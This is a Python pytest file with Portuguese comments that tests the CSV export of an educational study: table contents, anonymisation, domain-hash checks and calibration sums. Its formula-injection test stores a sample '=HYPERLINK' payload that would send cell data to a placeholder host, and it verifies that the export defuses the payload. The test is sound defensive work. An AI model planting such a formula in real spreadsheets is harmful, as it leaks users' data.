"""As três tabelas de análise do §12. Item 8 do §13.

Cada teste aqui protege uma análise do capítulo de resultados, não uma
função. Uma coluna errada não quebra nada em execução: produz um número
publicado que está errado.
"""

from __future__ import annotations

import csv
import sys
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import api.main as main
from engine.loader import load
from store import events as store_events
from tools import export


@pytest.fixture(scope="module")
def d():
    return load()


@pytest.fixture(scope="module")
def coleta(tmp_path_factory, d):
    """Uma coleta de brinquedo: quatro participantes, os dois braços.

    P01/P02 erram a primeira com confiança (crença ativa); P03 erra
    chutando (lacuna); P04 acerta tudo. É o mínimo para que as três
    tabelas tenham as linhas que as análises precisam distinguir.
    """
    tmp_path = tmp_path_factory.mktemp("coleta")
    banco = tmp_path / "coleta.db"
    mp = pytest.MonkeyPatch()
    mp.setattr(store_events, "DEFAULT_DB", banco)
    mp.setenv("STRUCTURA_EXPORT_TOKEN", "t")

    with TestClient(main.app) as c:
        c.app.state.db_path = banco

        def roda(participante, arm, *, erro=None, confianca="tenho certeza"):
            j = c.post("/sessions", json={
                "participant": participante, "arm": arm,
                "kc_sequence": ["kc_09"], "consented": True,
                "prior_c": d.study.prior_c_options[1]}).json()
            sid = j["session_id"]
            primeira = True
            for _ in range(200):
                a = j["next_action"]
                if a["kind"] == "done":
                    break
                if a["kind"] == "ciu":
                    ciu = d.cius[a["ciu_id"]]
                    alvo, conf = None, "tenho certeza"
                    if primeira and erro:
                        alvo = next((i for i, o in enumerate(ciu.options)
                                     if o.misconception == erro), None)
                        conf = confianca
                        if alvo is not None:
                            primeira = False
                    if alvo is None:
                        alvo = next(i for i, o in enumerate(ciu.options) if o.correct)
                    j = c.post("/sessions/%s/answer" % sid, json={
                        "ciu_id": ciu.id, "confidence": conf,
                        "elapsed_ms": 5000, "option_idx": alvo}).json()
                elif a["kind"] in ("ask", "explain"):
                    j = c.post("/sessions/%s/step" % sid, json={
                        "accepted": True, "elapsed_ms": 3000,
                        "kc": a["kc"], "node": a["node"]}).json()
                else:
                    if a["kind"] == "diagram":
                        c.post("/sessions/%s/telemetry" % sid, json={
                            "type": "diagram_toggled",
                            "payload": {"from_state": "a", "to_state": "b",
                                        "elapsed_ms": 700}})
                    j = c.post("/sessions/%s/ack" % sid, json={"elapsed_ms": 1200}).json()
            return sid

        roda("P01", "socratic", erro="free_nullifies")
        roda("P02", "direct", erro="free_nullifies")
        roda("P03", "socratic", erro="free_nullifies", confianca="chutei")
        roda("P04", "direct")

    conn = store_events.connect(banco)
    saida = tmp_path / "analise"
    export.exporta(conn, d, saida)
    yield saida, conn, banco
    conn.close()
    mp.undo()


def copia_banco(banco: Path, destino: Path):
    """Cópia do banco para os testes que MUTAM. A coleta é de módulo — roda
    uma vez — e nenhum teste pode deixar o banco diferente para o
    seguinte."""
    destino.write_bytes(Path(banco).read_bytes())
    return store_events.connect(destino)


def le(caminho):
    with Path(caminho).open(encoding="utf-8-sig", newline="") as f:
        return list(csv.DictReader(f))


# --------------------------------------------------------------------------
# answers.csv — desfecho primário
# --------------------------------------------------------------------------

def test_answers_tem_uma_linha_por_resposta(coleta, d):
    saida, conn, _ = coleta
    linhas = le(saida / "answers.csv")
    total = sum(
        1 for s in export.sessoes(conn)
        for e in store_events.read(conn, s["id"]) if e.type == "answer_submitted"
    )
    assert len(linhas) == total > 0


def test_answers_carrega_o_que_a_q_matrix_precisa(coleta):
    saida, _, _ = coleta
    for r in le(saida / "answers.csv"):
        assert r["ciu_id"] and r["kc"] and r["targets"]
        assert r["correct"] in ("0", "1")
        assert r["confidence"]


def test_distrator_escolhido_e_crenca_ativa_sao_colunas_DIFERENTES(coleta):
    """A distinção do §7.3, na tabela.

    P03 escolheu o MESMO distrator que P01, mas chutando. As duas linhas
    têm `chosen_misconception` igual e `belief_counted_active` diferente.
    Se fossem uma coluna só, a frequência de cada crença na população
    viria inflada por chutes.
    """
    saida, _, _ = coleta
    linhas = le(saida / "answers.csv")
    com_certeza = [r for r in linhas
                   if r["participant"] == "P01"
                   and r["chosen_misconception"] == "free_nullifies"]
    chutando = [r for r in linhas
                if r["participant"] == "P03"
                and r["chosen_misconception"] == "free_nullifies"]

    assert com_certeza and chutando
    assert com_certeza[0]["belief_counted_active"] == "1"
    assert chutando[0]["belief_counted_active"] == "0"
    assert chutando[0]["confidence"] == "chutei"


def test_distrator_sem_crenca_mapeada_e_identificavel(coleta, d):
    """§4.4: distrator sem `misconception_id` escolhido com frequência é
    crença fora do catálogo — achado, não falha. A coluna existe para que
    esse padrão possa ser contado."""
    saida, _, _ = coleta
    linhas = le(saida / "answers.csv")
    valores = {r["distractor_is_mapped"] for r in linhas}
    assert valores <= {"", "0", "1"}
    # No catálogo atual todo distrator está mapeado; a coluna fica vazia
    # nas respostas certas e vale 1 nas erradas.
    assert "1" in valores


def test_answers_nao_carrega_identificador_direto(coleta):
    """Anonimização na origem (§12)."""
    saida, _, _ = coleta
    with (saida / "answers.csv").open(encoding="utf-8-sig") as f:
        texto = f.read().lower()
    for proibido in ("@", "matricula", "matrícula", "cpf", "nome_completo"):
        assert proibido not in texto


# --------------------------------------------------------------------------
# sessions.csv — tempo, conclusão, abandono
# --------------------------------------------------------------------------

def test_sessions_tem_uma_linha_por_sessao(coleta, conn=None):
    saida, conn, _ = coleta
    assert len(le(saida / "sessions.csv")) == len(export.sessoes(conn)) == 4


def test_sessions_separa_o_tempo_por_fase_para_o_pareamento_do_paragrafo_8(coleta):
    """O §8 manda registrar o tempo nos dois braços: se A levar 8 min e B
    levar 2, uma diferença pode ser efeito de exposição, não do método."""
    saida, _, _ = coleta
    linhas = {r["participant"]: r for r in le(saida / "sessions.csv")}
    for r in linhas.values():
        assert int(r["ms_diagnostic"]) > 0
        assert int(r["ms_total_recorded"]) >= int(r["ms_diagnostic"])

    a, b = linhas["P01"], linhas["P02"]      # socrático × direto
    assert int(a["ms_correction"]) > 0 and int(b["ms_correction"]) > 0
    assert a["arm"] == "socratic" and b["arm"] == "direct"


def test_sessions_distingue_conclusao_de_abandono(coleta):
    saida, _, _ = coleta
    for r in le(saida / "sessions.csv"):
        assert r["completed"] in ("0", "1")
        assert r["end_reason"] in ("concluida", "parcial", "")
        assert (r["completed"] == "1") == (r["end_reason"] == "concluida")


def test_sessions_registra_o_hash_do_dominio(coleta, d):
    """§15: responde "os participantes viram o mesmo conteúdo?"."""
    saida, _, _ = coleta
    hashes = {r["domain_hash"] for r in le(saida / "sessions.csv")}
    assert hashes == {d.hash}


def test_sessions_conta_os_eventos_que_as_analises_usam(coleta):
    saida, _, _ = coleta
    linhas = {r["participant"]: r for r in le(saida / "sessions.csv")}
    assert int(linhas["P01"]["n_socratic_steps"]) > 0
    assert int(linhas["P02"]["n_explanations"]) > 0
    assert int(linhas["P01"]["n_explanations"]) == 0
    assert int(linhas["P02"]["n_socratic_steps"]) == 0
    assert int(linhas["P01"]["n_beliefs_detected"]) == 1
    assert int(linhas["P03"]["n_beliefs_detected"]) == 0   # chutou


# --------------------------------------------------------------------------
# calibration.csv
# --------------------------------------------------------------------------

def test_calibration_tem_uma_linha_por_participante_e_nivel(coleta, d):
    saida, conn, _ = coleta
    linhas = le(saida / "calibration.csv")
    assert len(linhas) == 4 * len(d.study.confidence_scale)


def test_calibration_ordena_a_escala_sem_depender_do_rotulo(coleta, d):
    saida, _, _ = coleta
    for r in le(saida / "calibration.csv"):
        rank = int(r["confidence_rank"])
        assert 1 <= rank <= len(d.study.confidence_scale)
        assert d.study.confidence_scale[rank - 1] == r["confidence"]


def test_calibration_bate_com_answers(coleta):
    """As duas tabelas saem do mesmo log: somar uma tem de dar a outra."""
    saida, _, _ = coleta
    respostas = le(saida / "answers.csv")
    calib = le(saida / "calibration.csv")

    for r in calib:
        se_encaixam = [
            a for a in respostas
            if a["participant"] == r["participant"] and a["confidence"] == r["confidence"]
        ]
        assert int(r["n"]) == len(se_encaixam)
        assert int(r["n_correct"]) == sum(1 for a in se_encaixam if a["correct"] == "1")


def test_calibration_do_chute_tem_acerto_menor(coleta):
    """O sinal que Milne & Rowe (2002) reporta: o aluno que chuta acerta
    menos. Se isto não aparecer nos dados reais, é achado, não bug."""
    saida, _, _ = coleta
    p3 = {r["confidence"]: r for r in le(saida / "calibration.csv")
          if r["participant"] == "P03"}
    assert int(p3["chutei"]["n"]) >= 1
    assert p3["chutei"]["prop_correct"] == "0.0"


# --------------------------------------------------------------------------
# §15 — o domínio mudou no meio da coleta?
# --------------------------------------------------------------------------

def test_um_unico_hash_de_dominio_em_toda_a_coleta(coleta, d):
    _, conn, _ = coleta
    grupos = export.hashes_divergentes(conn)
    assert list(grupos) == [d.hash]


def test_hash_divergente_e_detectado(coleta, d, tmp_path):
    """Se duas sessões viram conteúdos diferentes, o export tem de dizer."""
    _, _, banco = coleta
    conn = copia_banco(banco, tmp_path / "div.db")
    try:
        store_events.add_participant(conn, "P99", "socratic")
        store_events.start_session(conn, "P99", "socratic", ["kc_09"],
                                   "sha256:outro", session_id="SX")
        grupos = export.hashes_divergentes(conn)
        assert len(grupos) == 2
        assert grupos["sha256:outro"] == ["SX"]
    finally:
        conn.close()


def test_a_analise_nao_le_a_projecao(coleta, d, tmp_path):
    """§5.1: `node_state` é cache. Apagá-la não pode mudar o export."""
    saida, _, banco = coleta
    antes = le(saida / "answers.csv")
    conn = copia_banco(banco, tmp_path / "sem-projecao.db")
    try:
        conn.execute("DELETE FROM node_state")
        destino = tmp_path / "sem-projecao"
        export.exporta(conn, d, destino)
        assert le(destino / "answers.csv") == antes
    finally:
        conn.close()


def test_cli_escreve_os_tres_arquivos(coleta, d, tmp_path, monkeypatch):
    saida, _, banco = coleta
    destino = tmp_path / "saida-cli"
    monkeypatch.setattr(store_events, "DEFAULT_DB", banco)
    assert export.main(["--db", str(banco), "--out", str(destino)]) == 0
    for nome in ("answers.csv", "sessions.csv", "calibration.csv"):
        assert (destino / nome).exists()


# --------------------------------------------------------------------------
# Injeção de fórmula
# --------------------------------------------------------------------------

def test_resposta_livre_nao_vira_formula_na_planilha(d, tmp_path):
    """As CIUs de lacuna aceitam texto do participante, e esse texto vai
    direto para uma planilha que o pesquisador abre. Sem neutralizar, um
    `=HYPERLINK(...)` seria EXECUTADO ao abrir answers.csv."""
    banco = tmp_path / "injecao.db"
    conn = store_events.open_db(banco)
    try:
        store_events.add_participant(conn, "P01", "socratic", "x")
        sid = store_events.start_session(conn, "P01", "socratic", ["kc_11"], "h")
        store_events.append(conn, sid, "answer_submitted", {
            "ciu_id": "ciu_kc11_003", "kc": "kc_11", "option_idx": None,
            "text": '=HYPERLINK("http://exemplo/"&A1,"clique")',
            "confidence": "chutei", "elapsed_ms": 10, "correct": False})
        saida = tmp_path / "csv"
        export.exporta(conn, d, saida)
    finally:
        conn.close()

    with (saida / "answers.csv").open(encoding="utf-8-sig", newline="") as f:
        linhas = list(csv.reader(f))
    for linha in linhas[1:]:
        for celula in linha:
            assert not celula.startswith(("=", "+", "@")), celula

    resposta = linhas[1][linhas[0].index("response_text")]
    assert resposta.startswith("'="), "a formula tem de sair inerte"
    assert "HYPERLINK" in resposta, "o dado tem de continuar la"


def test_resposta_de_lacuna_sai_crua_e_legivel(coleta, d, tmp_path):
    """O analista tem de ver `*(a + i)`, não `"*(a + i)"`."""
    banco = tmp_path / "livre.db"
    conn = store_events.open_db(banco)
    try:
        store_events.add_participant(conn, "P01", "socratic", "x")
        sid = store_events.start_session(conn, "P01", "socratic", ["kc_11"], "h")
        store_events.append(conn, sid, "answer_submitted", {
            "ciu_id": "ciu_kc11_003", "kc": "kc_11", "option_idx": None,
            "text": "*(a + i)", "confidence": "tenho certeza",
            "elapsed_ms": 10, "correct": True})
        saida = tmp_path / "csv2"
        export.exporta(conn, d, saida)
    finally:
        conn.close()
    assert le(saida / "answers.csv")[0]["response_text"] == "*(a + i)"


def test_neutraliza_preserva_o_que_nao_e_perigoso():
    assert export.neutraliza("*(a + i)") == "*(a + i)"
    assert export.neutraliza("=1+1") == "'=1+1"
    assert export.neutraliza(42) == 42
